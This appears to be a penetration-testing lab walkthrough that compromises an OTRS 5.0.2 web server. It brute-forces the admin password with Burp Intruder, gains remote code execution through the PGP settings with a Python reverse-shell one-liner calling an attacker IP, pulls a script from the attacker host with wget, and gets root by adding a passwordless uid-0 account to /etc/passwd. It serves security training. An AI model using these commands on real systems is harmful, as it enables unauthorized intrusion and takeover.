Report

Report

1. NMAP SYN Stealth scan for open ports. Ports 22, 80, 3306.
`sudo nmap -p- 10.11.1.39`
![3f3c70067d10a334f19a890245442270.png](a188d6b926fe48e8beeabce81dd3c137.png)


2. NMAP SYN stealth scan with service detection and aggressive switch only for open ports. We see that this is likely a Linux box.
`sudo nmap -p22,80,3306 -sV -A 10.11.1.39`
![a4f0a72852f0c2c98d8f770d8cac7f8e.png](6094bdd3df7c44fd82721745b35170e3.png)


3. Enumerate the web server using dirb. We see only /cgi-bin/ and a robots.txt file
`dirb http://10.11.1.39 -r`
![18be32f4a7a0c9973741e97ab8d8fb8a.png](66c395e0457541b4945eca9b5e7f6482.png)


4. There is a robots.txt file that redirects to bad.txt. Investigate this later
[http://10.11.1.39/bad.txt](http://10.11.1.39/bad.txt)
![aa39da83e52bae2d3056cc593e4cabb3.png](dcf89e8864ba49a2aada04fe2dcaef58.png)


5. Continue to enumerate the web server with Nikto. Of interest is the references to OTRS version 5.0.2. It was able to read an entry in robots.txt which specifies /otrs/index.pl. It also contains an uncommon header 'content-disposition' with contents 'Filename=Installer.html'
`nikto -h http://10.11.1.39`
![75c6e857218b1008bc6ccd86203a7a17.png](db37d3f459f34c878df24d215c39ca6c.png)


6. Browse to /otrs/index.pl
http://10.11.1.39/otrs/index.pl
![a2be1a88aa6c96a7d343d1b879a58f8c.png](044fef037dc3497a9803eb36a70ded90.png)


7. Google search for default OTRS credentials. Search term: **otrs default password**. We see the default creds are `root@localhost:root`
![7ed087970966b2c01bd3ccf8a5783906.png](1ea96d0e2592400fb45999e835ec5b2b.png)


8. Attempt to login to OTRS 5 with default credentials root@localhost:root. It does not work.
![bae5c81d0cbeadebec24e94831f3a22f.png](d4912fe66a814220a8bc44bab1cd39d2.png)
![d8f8d59f7fe9cf9eced27df0e1f8ac88.png](3f3fd340ab484f78a5c110ad0b6c5ce7.png)


9. View the source code for view-source:http://10.11.1.39/otrs/index.pl
![06998a75b0a53416eb18c4168b664e71.png](decc98396fbd4f51a44094213e9226e3.png)


10. Use Cewl to create a custom wordlist of possible passwords
`cewl -m 4 -w cewl_otrs.txt http://10.11.1.39/otrs/index.pl`
![04ffe77bd944b2c8e0ebdc3806201c19.png](7f87a6a1824546f29ff5901552796daf.png)


11. We get 51 in our custom wordlist. ![0314469014d767c548270a9fc69da31b.png](5498420e6e624279bd327a9e4c4f8bbb.png)


12. Open Burpsuite and start a temporary project
![94b99d341fac39a63bb8b2a4ffe0ac4e.png](b39e9a42775242a7990a3ab8ee78e7bd.png)


13. Use Burp defaults, and  click Next to Start Burp
![b4a48344c67305ceaae2e9c0b56243dd.png](d24cfde1b92e42a5b2993dfd85c3048f.png)


14. Click on Proxy tab -> click HTTP History tab
![bc49350b3442efdde3fde876c24eb5c2.png](e472125c69e7407b803f8c1229d16c06.png)


15. Open a new browser, and ensure that FoxyProxy is on for Burp
![b526a1baf5e568073216680f1dd07c53.png](27f740c86c484f08b6129e5b5fa45121.png)


16. Browse to the /otrs/index.pl login page
`http://10.11.1.39/otrs/index.pl`
![8fcf863712440d68219062654806ebbe.png](b46632d636314e9fbc4fd6b01194892f.png)


17. On the browser, enter any credentials, in this example we will use admin:admin, then press the Login Button. We expect this to fail.
![63aa659e653467f8cfb41fdc576586ae.png](c2434016cd2b4f7db0ddc38753d245db.png)


18. Indeed the login attempt using admin:admin failed.
![763a5b0612e70b1e1eece5acd1696cbc.png](c34fd6b7e6ac43cfb318b7cc57d1e771.png)


19. Go back to Burp, and find the POST request on /otrs/index.pl where we used to login to admin:admin
![bdbb6ff9e7ace2941e720d1048385536.png](8830bc250cb24fabaaf7f6e46f3a121f.png)


20. Right clik on the POST request  and send to the Intruder. Then view the Positions tab
![04de1811b10d490d0b783581b52e5326.png](d0cf061963554eb09c398146cab5c9a1.png)


21. Clear all payload markers by pressing the `Clear` button on the right
![5f7b472fcab5be917ba11a8602a8f114.png](bf9d6831ccaa4b56bd2ffbcbf338746f.png)


22. Change the User to root@localhost, and 'Add' a new payload marker for the Password value
![79e81b1fd37456dab991d9a3ea3d9efe.png](dd0faae399b7479bb9f4bfc96ae83109.png)


23. Click the Payloads tab. On the Payloads Options (Simple List) form, copy the words we had gotten from the cewl command, and paste them into the form
![ff592f2652bd37c8ab654e826c07d430.png](79d88f7d42364f708cd7fe7942695da6.png)


24. Press the `Start attack` Button
![f565343512bd838836634ac029d810df.png](c844089a288b4e2bb8e94a7ff3c22826.png)


25. Press OK if the following window pops up about throttling.
![c3f3c612e0a032c5ce967161505d5bcc.png](6f3e63990fe44f60adeb06959b5e3e7b.png)


26. View the results
![64df6f92deb51466b4542b97009b32f3.png](86a64bc3915648c2a571e8fda0e89024.png)


27. Notice that of all the requests, 'otrs' has a different Length value (469) than the rest (18661).
![8b78b3691b46f0e07694a80e8317cbc1.png](eabe24d976e443ff8b1a2447d76f5b4a.png)


28. Login to /otrs/index.pl using creds root@localhost:otrs
![5a78bb0d1facf841599e3a63ff0de249.png](058f0851f4db4acca8261718c2717c78.png)


29. We are logged in and are presented with the dashboard
![0257eccf4a76ba8fb2fc5f03a7ecbea2.png](ed321fb2d36147c58ddbb775e407d355.png)


30. Upon login, we see the language is not in English
![9e7774c5ba353b1eab61f5d96a96f94f.png](e207941b60dd49e2b2fe1cf10559256e.png)


31. Google translate tells us that the language is Swedish. We had copied the message in the red color block. 
`Använd inte superuserkontot för att arbeta med OTRS! Skapa nya handläggare och arbeta med dom istället.`
![d874f16d858959efccf17acb9396eace.png](6f31e13e1cef454b968639fc4e145a61.png)


32. Click on the Settings button that looks like a gear above the Dashboard menu.
![ced254de468645d5e1c89359c8ecb227.png](2b7e76b374694407ab3a40ed3145ee11.png)


33. In the Sprak section, click in the Sprak input box to get a drop-down list of languages
![2b58add65d1f0631c6498776817e95bc.png](07003a222e4047aa93c9389b48c7e7a5.png)
![b00c4035816e852bd6a272885947d420.png](8fbf99b2c5344125b2681edd604ab296.png)


34. Choose English (United States) and press the 'Uppdaterra' button
![4634fd544673e398752176d37fd7ee4c.png](130485973cbe41a1aec7041d8dfa2d13.png)


35. We see now that the language is English
![80a77bbca77b6a33cb53fd98a8c43898.png](bb7b87e2959b4a449ebfa20e6ca62af2.png)


36. Search for an exploit for OTRS 5.0.2 
`searchsploit otrs`
![ae880e49e79ca71b577d6eb09e1efc41.png](f4deb7bfb08a4f0f9e55f86763d2609c.png)


37. There is an exploit for remote command execution that contains version 5.0.2, let's download that.
`searchsploit -m 43853`
![9568158eff1f3c9866cb11d28c245f17.png](a159d915967f4e6bac9b284139914f65.png)


38. Exploit 43853 looks like this:
`cat 43853.txt`
![4672c403b5a64122dfdf2af7d59aa6a9.png](57600b03a520490ba4cca1401e1d910e.png)


39. Begin to exploit using 43853.txt by opening the Admin tab
![04cc8cb38b2a7a6b8a7ffae7a389a9e1.png](d13faee5fe6b4475b3d85f07d721e326.png)
![afce964feee78355d8a89823673423c1.png](9f85bd806ebf43df8fc73c4467f461c9.png)


40. In the System Administration Section, click the SysConfig link
![1eeb8a43dfcd09ad55dd58aa3fa1d902.png](2d0171797af940ba9c6d01b445f527ee.png)


41. Find the "Crypt:PGP" subgroup by inputting 'PGP' in the Navigate settings, then press search icon
![085a276405d60004132c75414382736b.png](22d073dec5fb4786b67a61f852fa7b5c.png)


42. We see the Crypt:PGP group. Click on the link for Ctypt:PGP
![79d317ec44ba114c303108fa37454ba6.png](671c3908ad28491c98370c6689de7777.png)
![f092acf72e5bd6472efab93fb3f1a99e.png](cdddbec6b2f34db88cec437061e8ef8d.png)


43. Update PGP to 'Yes'
![323627e310942d24b6ed6afc5ae5a00b.png](1b3ba2432ff24591a9d4a5e988b74e18.png)


44. Update PGP::Bin
`/usr/bin/python`
![dce95f0109f21742d457f43702926604.png](9efd8839ae8f4b06a04ccce20b5a34ca.png)


45. Update PGP::Options (you must the Kali attacker IP and port 5678)
`-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.214",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
![fd8ed4d38b94e2717a41a5812dec2312.png](49110add940448b29712611dfd60217a.png)


46. Press the 'Update' button at the bottom of the page.
![5e9486a4cbb5931e5541262b4406e240.png](27c7dab02c90491696dd0d9ab09603a4.png)


47. We are taken back to the Admin tab
![35c71c1a0e3449aaa17e373df2946b0c.png](a5c29f01a5ec46f7ac0840b267352a75.png)


48. Start a netcat listener port 5678
![e4e70661cc0ea2776c46d1ce719416a6.png](6b63ade4ca89445db86b5be73f395838.png)


49. Execute the code by opening a new tab and browsing to
[10.11.1.39/otrs/index.pl?Action=AdminPGP](10.11.1.39/otrs/index.pl?Action=AdminPGP). The feature is disabled. Enable it!
![57fa049050c27a9655ba7d7d96a61388.png](14bdde00b10f413eb9a17e348d631cec.png)


50. We are taken back to the Admin tab. Ensure the PGP, PGP::Bin, and PGP Options were set as earlier, and press the Update button
![73fadf9839c8fc1c1218521eb550d63d.png](636399e27a4a4f4eadd1d7a57453663b.png)


51. Navigate to 10.11.1.39/otrs/index.pl?Action=AdminPGP in a new tab again
![c394231b330c390becf4c6310faac50c.png](905313bfc4d54d7fb01749ba8350ef7e.png)


50. Notice we have a shell on the Kali listener
![c21bcc76aa38bd5e4aae8dd6401a1835.png](a9fd090039b24ba386b95c791e45df02.png)


51. We are user apache
![fddde124ff9244956a5a4858ce150d89.png](27f54ec8a1284a088e5b82e889d01d17.png)


# Privilege Escalation

52. Find the first 10 world-writable directories.
`find / -writable -type d 2>/dev/null | head -n 10`
![eedcf614cfd1e118b3859ec02c7b59e1.png](7945f00bd6124cf29f07867dcc092024.png)


53. Test /dev/shm if we can write to it.
Change to /dev/shm directory, create a file in it and check it's there using the list command. Yes we can write to it
`cd /dev/shm`
`touch test`
`ls -la`
![ea5e876c508260ae5295d2ccb182106c.png](ac1bf401ac7c4424aa28524c4c3e4666.png)


54. On the attack machine, git clone the repo for Linux Smart Enumeration tool
`git clone https://github.com/diego-treitos/linux-smart-enumeration.git`
![5469b1c366aa9a86106961fc20def6b5.png](4a90ab525f1e4ec699a132bb73d7b20b.png)


55. Change to the directory containing the script
`cd linux-smart-enumeration/`
![2eaa532001c71e2f1377142892417fd3.png](d7d7f3e5170d46108198c90095a0f0e7.png)

56. List the files
`ls`
![6cd6ee186ec617641ef6328b04cded53.png](e95751dcb4c745f7a1034d58269f24ee.png)

57. Serve the file on the attack machine
`sudo python -m SimpleHTTPServer 80`
![a7f661fd1c28bde6a97d4bd8a0d2326a.png](e86c1e5d20904ebbb6a7e021101046f3.png)

58. On the target machine, ensure we are still in the world writable directory /dev/shm
`pwd`
![08acaab2dc2b308ee12ab28dfddede55.png](22e463741b8749268c47ecf08969f946.png)


59. Download using wget
`wget http://192.168.119.214:80/lse.sh`
![a0ffece95d761ff03bb7498620270ddd.png](699c5e23aa3b48749ec81bb1ed622775.png)


60. Change permissions
`chmod +x lse.sh`
![32ac965ad6021e01142f651ccaf4b17e.png](c2a2f0d846c74b13a231836378bd2ac2.png)


61. Run the Linux Smart Enumeration script
`./lse.sh`
![cf21d9650c6e4a75043e07ebb381f15a.png](601ab2a4a8d942669d71152a953476a2.png)


62. Aha! We can write to /etc/passwd
![f3f184af0e80f4ab550cd4fae3f63c2d.png](f404e72e35d44a9c86804d250fe48de0.png)


63. Upgrade to interactive shell
Check which python is installed
`which python`
![7cc441ec447d8bcc367fcfbb8cd6a5ee.png](dcc1f3d878684f888a2fd9458af08eb3.png)


64. Spawn a bash shell and put in background
`python -c 'import pty;pty.spawn("/bin/bash")'`
![1e0e033434454b5cace9d55dcb93d23b.png](a7657c23f0f8426cb8cd406a2cde08fc.png)


65. Put the shell on background
`Ctrl-Z`
![c6c45fee5aa030b392385a434f9c9433.png](1269a41076264d5bbd101a4314368518.png)


**We are back on the attacker terminal**
66. Find information about our own terminal
`echo $TERM`
![5e86ac15e07e53b3eeef5aefb15fd3df.png](f335c66492ea4d099255d74a702069cd.png)


67. View the terminal's characteristics. Take note of the number of rows (32) and columns (86)
`stty -a`
![ce6f06cd765f89c9e09560989fdd33d8.png](41af2f043cda418395e4e561a52e6ff2.png)


68. Enter the command that allows us to pass keyboard shortcuts through
`stty raw -echo`
![f0f57f5ed4844abc00039023d2cabfcb.png](3935b498daa84f8b89d567877c9c6890.png)


69. Foreground the shell and press enter. You will not see fg when you type it.
`fg`


70. The netcat command will reappear automatically
![e15a657da17daa80f64eaeaa4bfdbc3e.png](5ec49b5cb6314bf9a908bc9bf5fb5365.png)


71. Type 'reset' and press enter
`reset`
`<Enter>`
![5b9a3edd09272a2472325737e34123e5.png](dd8457fad7c447a683ca49f8efe0affb.png)




72. For terminal type, type in xterm-256color, then press Enter
`xterm-256color`
`Enter`
![ba7b9e48d2120608fa0a1ca2a9c85f09.png](19db7d35a656403d806a2dfa77ae9227.png)




73. Set the terminal size to the same settings as our native terminal
`stty rows 31 columns 87`
![1876132950563aa09942d6b0d9a94c27.png](b6856a51c6d84c08a28aeeba4bc08900.png)


74. Open /etc/password with vi
`vi /etc/passwd`
![cb92fd72a68c6e59eb1010608f4fd03e.png](9a34a867742d45c68f20414038861add.png)


75. Yank the first line 
`<ESC>`
`yy`
![3ed8776e4ca4618727cfebb3a9ef2e19.png](daec9cc040dc419a91f0ca18283e6bd8.png)


76. Put cursor to the bottom of the file
`<Shift> + G`
![e407029aedea734c954f2e96a35e7c87.png](9064d57c1e45492c91da629acc90c840.png)


77. Paste the first line by pressing p
`p`
![15b25bf545a4b98dbffde501380d0e45.png](46e8cec3a6ae45d38a073f4c9cd74183.png)


78. Enter insert mode by pressing i
`i`
![d426cc45c6ce28fcb62e550d6cdaee61.png](647953aa1ad448afac9365a00ae85a10.png)


79. Edit that last line by changing the username to newuser, and leaving the password field blank.
`newuser::0:0:root:/root:/bin/bash`
![ae73651844dacfe4f612a0d4153ac038.png](73abbcea68ec4e6885bfe1dc3d25c417.png)


80. Press the ESC key
![29d922df9edcb32502e3db29bebd04ef.png](defe55ff5f554070859ad0b6885da82b.png)


81. Save changes and quit file
`:wq!`
![f9ca9628104a13872032cb2c0b1977d6.png](4987f47596ed414aabaf574149175d39.png)


82. Log in as newuser. You are root!
`su newuser`
`whoami`
`ifconfig`
`cat /root/proof.txt`
![208a8e567ff45e936198cdce444aa48d.png](bd60436edef1452b9c34861a1b000fe7.png)


